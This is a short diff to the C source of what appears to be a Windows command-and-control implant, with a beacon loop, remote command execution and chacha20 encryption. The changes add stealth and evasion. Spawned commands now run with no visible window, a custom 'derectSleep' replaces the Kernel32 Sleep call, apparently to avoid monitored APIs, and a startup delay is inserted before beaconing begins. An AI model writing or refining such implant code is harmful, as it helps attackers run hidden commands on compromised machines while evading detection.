@@ -12,6 +12,7 @@ typedef struct {
 
 // External function provided
 extern void* chacha20_Full(void* message, void* buffer, uint64_t length);
+extern int derectSleep(BOOL Alertable, int DelayInterval); //DelayInterval take seconds , Alertable = FALSE
 
 void ___chkstk_ms(void){
     return;
@@ -377,7 +378,7 @@ BOOL gostExecute(char* command, char* output, DWORD outputSize, PFUNCTION_TABLE 
         NULL,
         NULL,
         TRUE,           // Inherit handles
-        0,
+        CREATE_NO_WINDOW,
         NULL,
         NULL,
         &si,
@@ -418,6 +419,10 @@ BOOL gostExecute(char* command, char* output, DWORD outputSize, PFUNCTION_TABLE 
 
 
 void __main(void) {
+
+    derectSleep(FALSE,20);
+
+
     // Initialize function table
     FUNCTION_TABLE functionTable;
 
@@ -474,7 +479,7 @@ void __main(void) {
     while (1)
     {
         c2BeaconCommunicate(ft);
-        ft->Kernel32.Sleep(5000); // Sleep for 5 seconds before next beacon
+        derectSleep(FALSE, 5); // Sleep for 5 seconds before next beacon
     }
     
     
